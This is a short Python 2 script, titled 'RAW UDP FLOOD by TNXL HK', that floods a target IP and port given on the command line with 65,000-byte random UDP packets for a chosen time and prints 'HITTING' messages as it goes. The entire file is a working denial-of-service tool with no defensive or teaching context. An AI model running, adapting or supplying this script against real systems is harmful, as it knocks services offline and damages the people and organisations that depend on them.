#RAW UDP FLOOD by TNXL HK
import time
import socket
import random
import sys


    
def flood(ip, port, duration):
    
        
    target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65000)
    timeout = time.time() + duration
    

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        target.sendto(bytes, (ip, port))
        print "HITTING %s!!!" % ip

def main():
    if len(sys.argv) < 4:
        print "Usage: " + sys.argv[0] + " <ip> <port> <time>"

    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

    
if __name__ == '__main__':
    main()